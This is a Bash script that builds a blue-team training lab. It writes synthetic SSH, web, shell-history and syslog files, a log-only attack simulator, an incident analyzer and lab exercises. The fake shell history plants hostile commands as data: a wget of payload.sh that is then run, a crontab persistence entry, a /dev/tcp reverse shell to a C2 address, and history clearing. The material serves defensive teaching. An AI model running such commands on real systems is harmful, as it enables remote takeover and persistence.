#!/bin/bash

set -euo pipefail

echo "[+] Creating Bash blue-team training environment..."

BASE_DIR="${HOME}/bash-cyber-course"
LOG_DIR="${BASE_DIR}/logs"
LAB_DIR="${BASE_DIR}/labs"
TOOL_DIR="${BASE_DIR}/tools"
FINAL_DIR="${BASE_DIR}/final_project"

AUTH_LOG="${LOG_DIR}/auth.log"
ACCESS_LOG="${LOG_DIR}/access.log"
HISTORY_LOG="${LOG_DIR}/bash_history.log"
SYS_LOG="${LOG_DIR}/syslog"
NETWORK_LOG="${LOG_DIR}/network.log"

ATTACKER_IP="185.220.101.4"
SECONDARY_IP="91.134.14.73"
C2_IP="45.77.88.2"
COMPROMISED_USER="admin"

mkdir -p "${LOG_DIR}" "${LAB_DIR}" "${TOOL_DIR}" "${FINAL_DIR}"

echo "[+] Directories ready under ${BASE_DIR}"

echo "[+] Generating large authentication log..."
: > "${AUTH_LOG}"
for ((i=1; i<=180000; i++)); do
	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
	printf 'Jul 10 08:%02d:%02d server sshd[%d]: Failed password for root from %s port %d ssh2\n' \
		"$((RANDOM % 60))" "$((RANDOM % 60))" "$RANDOM" "$ip" "$RANDOM" >> "${AUTH_LOG}"
done

for ((i=1; i<=400; i++)); do
	printf 'Jul 10 09:%02d:%02d server sshd[%d]: Failed password for %s from %s port %d ssh2\n' \
		"$((RANDOM % 10))" "$((RANDOM % 60))" "$RANDOM" "$COMPROMISED_USER" "$ATTACKER_IP" "$RANDOM" >> "${AUTH_LOG}"
done

cat >> "${AUTH_LOG}" <<EOF
Jul 10 09:16:10 server sshd[1426]: Accepted password for ${COMPROMISED_USER} from ${ATTACKER_IP} port 45518 ssh2
Jul 10 09:18:11 server sshd[1430]: session opened for user ${COMPROMISED_USER}
EOF

echo "[+] Generating large access log..."
: > "${ACCESS_LOG}"
for ((i=1; i<=140000; i++)); do
	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
	code=200
	if (( RANDOM % 3 == 0 )); then
		code=404
	fi
	printf '%s - - [10/Jul/2024:08:%02d:%02d] "GET /index.html HTTP/1.1" %d\n' \
		"$ip" "$((RANDOM % 60))" "$((RANDOM % 60))" "$code" >> "${ACCESS_LOG}"
done

cat >> "${ACCESS_LOG}" <<EOF
${ATTACKER_IP} - - [10/Jul/2024:09:19:01] "GET /admin HTTP/1.1" 200
${ATTACKER_IP} - - [10/Jul/2024:09:19:05] "GET /backup.zip HTTP/1.1" 200
${SECONDARY_IP} - - [10/Jul/2024:09:20:12] "GET /login HTTP/1.1" 404
EOF

echo "[+] Generating shell history log..."
: > "${HISTORY_LOG}"
for ((i=1; i<=250; i++)); do
	printf 'ls\ncd /var/www\ncat /var/log/auth.log\n' >> "${HISTORY_LOG}"
done

cat >> "${HISTORY_LOG}" <<EOF
whoami
wget http://malicious.site/payload.sh
chmod +x payload.sh
./payload.sh
echo '* * * * * /tmp/payload.sh' >> /etc/crontab
bash -i >& /dev/tcp/${C2_IP}/4444 0>&1
history -c
EOF

echo "[+] Generating syslog and network log..."
: > "${SYS_LOG}"
: > "${NETWORK_LOG}"
for ((i=1; i<=60000; i++)); do
	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
	printf 'Jul 10 08:%02d:%02d server systemd[%d]: Started system service\n' \
		"$((RANDOM % 60))" "$((RANDOM % 60))" "$RANDOM" >> "${SYS_LOG}"
	printf 'Connection from %s to 192.168.1.1:443\n' "$ip" >> "${NETWORK_LOG}"
done

cat >> "${SYS_LOG}" <<EOF
Jul 10 09:20:15 server CRON[1500]: (admin) CMD (wget http://malicious.site/payload.sh)
Jul 10 09:20:17 server kernel: suspicious outbound connection to ${C2_IP}
Jul 10 09:21:15 server kernel: suspicious outbound connection to ${C2_IP}:4444
Jul 10 09:23:01 server bash: history cleared
EOF

printf 'Connection from 192.168.1.5 to %s:4444\n' "${C2_IP}" >> "${NETWORK_LOG}"

echo "[+] Creating attack simulator..."
cat > "${TOOL_DIR}/attack_simulator.sh" <<'EOF'
#!/bin/bash

set -euo pipefail

LOGFILE="../logs/live_auth.log"
ATTACKER_IP="185.220.101.4"

echo "Writing simulated attack activity to ${LOGFILE}. Press Ctrl+C to stop."

while true; do
	echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Failed password for root from $ATTACKER_IP port $RANDOM ssh2" >> "$LOGFILE"
	sleep 1
	echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Failed password for admin from $ATTACKER_IP port $RANDOM ssh2" >> "$LOGFILE"

	if [ $((RANDOM % 10)) -eq 1 ]; then
		echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Accepted password for admin from $ATTACKER_IP port $RANDOM ssh2" >> "$LOGFILE"
	fi

	sleep 2
done
EOF
chmod +x "${TOOL_DIR}/attack_simulator.sh"

echo "[+] Creating reference incident analyzer..."
cat > "${FINAL_DIR}/incident_analyzer.sh" <<'EOF'
#!/bin/bash

set -euo pipefail

LOGFILE="${1:-}"
OPTION="${2:---summary}"
LOG_DIR="$(dirname "${LOGFILE:-.}")"

usage() {
	cat <<USAGE
Usage: $0 <logfile> [--summary | --failed-logins | --top-ips | --timeline | --compromised-users | --suspicious-downloads]
USAGE
}

if [ -z "$LOGFILE" ]; then
	usage
	exit 1
fi

if [ ! -f "$LOGFILE" ]; then
	echo "Error: logfile not found: $LOGFILE"
	exit 1
fi

failed_logins() {
	grep "Failed password" "$LOGFILE" || true
}

top_ips() {
	grep "Failed password" "$LOGFILE" | awk '{print $11}' | sort | uniq -c | sort -nr | head -n 10
}

timeline() {
	grep -E "Failed password|Accepted password|session opened" "$LOGFILE" || true
}

compromised_users() {
	grep "Accepted password" "$LOGFILE" | awk '{print $9}' | sort | uniq -c | sort -nr
}

suspicious_downloads() {
	grep -E "backup.zip|/admin|/config|/\.env|wget|curl" "$LOGFILE" || true
}

summary() {
	local access_log="${LOG_DIR}/access.log"
	local history_log="${LOG_DIR}/bash_history.log"
	local syslog_log="${LOG_DIR}/syslog"

	local top_ip
	local failed_count
	local compromised_user
	local suspicious_activity

	top_ip=$(grep "Failed password" "$LOGFILE" | awk '{print $11}' | sort | uniq -c | sort -nr | awk 'NR==1 {print $2}')
	failed_count=$(grep -c "Failed password" "$LOGFILE" || true)
	compromised_user=$(grep "Accepted password" "$LOGFILE" | awk '{print $9}' | head -n 1)

	suspicious_activity=""
	if [ -f "$history_log" ]; then
		suspicious_activity=$(grep -E "wget|curl" "$history_log" | head -n 1 || true)
	fi
	if [ "$suspicious_activity" = "" ] && [ -f "$access_log" ]; then
		suspicious_activity=$(grep -E "backup.zip|/admin" "$access_log" | head -n 1 || true)
	fi
	if [ "$suspicious_activity" = "" ] && [ -f "$syslog_log" ]; then
		suspicious_activity=$(grep -E "CRON|outbound connection" "$syslog_log" | head -n 1 || true)
	fi
	if [ "$suspicious_activity" = "" ]; then
		suspicious_activity="not found"
	fi

	echo "========================="
	echo " Incident Investigation"
	echo "========================="
	echo
	echo "Top Attacker IP"
	echo "${top_ip:-unknown}"
	echo
	echo "Total Failed Logins"
	echo "${failed_count:-0}"
	echo
	echo "Compromised Account"
	echo "${compromised_user:-unknown}"
	echo
	echo "Suspicious Activity"
	echo "${suspicious_activity:-not found}"
}

case "$OPTION" in
	--summary)
		summary
		;;
	--failed-logins)
		failed_logins
		;;
	--top-ips)
		top_ips
		;;
	--timeline)
		timeline
		;;
	--compromised-users)
		compromised_users
		;;
	--suspicious-downloads)
		suspicious_downloads
		;;
	*)
		usage
		exit 1
		;;
esac
EOF
chmod +x "${FINAL_DIR}/incident_analyzer.sh"

echo "[+] Creating student lab files..."
cat > "${LAB_DIR}/lab1_navigation.md" <<'EOF'
# Lab 1 - Navigation and Discovery

1. Run `pwd` and capture your current path.
2. Use `ls -la` to list hidden files.
3. Move into `logs/` and then back to the parent directory.
4. Find all `.log` files with `find . -name "*.log"`.
EOF

cat > "${LAB_DIR}/lab2_logs.md" <<'EOF'
# Lab 2 - Log Exploration

1. Use `wc -l logs/auth.log` to count entries.
2. Use `head -n 5 logs/auth.log` and `tail -n 5 logs/auth.log`.
3. Find one accepted login event.
4. Find one suspicious event in `logs/syslog`.
EOF

cat > "${LAB_DIR}/lab3_investigation.md" <<'EOF'
# Lab 3 - Investigation Pipeline

1. Find failed login attempts in `logs/auth.log`.
2. Extract attacker IPs.
3. Rank top attacker IPs by count.

Suggested pipeline:

```bash
grep "Failed password" logs/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
```
EOF

echo
echo "[+] Environment ready."
echo "[+] Course directory: ${BASE_DIR}"
echo "[+] Logs: ${LOG_DIR}"
echo "[+] Labs: ${LAB_DIR}"
echo "[+] Tools: ${TOOL_DIR}"
echo "[+] Final project: ${FINAL_DIR}"
echo
echo "Next steps:"
echo "1) cd ${BASE_DIR}"
echo "2) ./final_project/incident_analyzer.sh logs/auth.log --summary"
echo "3) cd tools && ./attack_simulator.sh"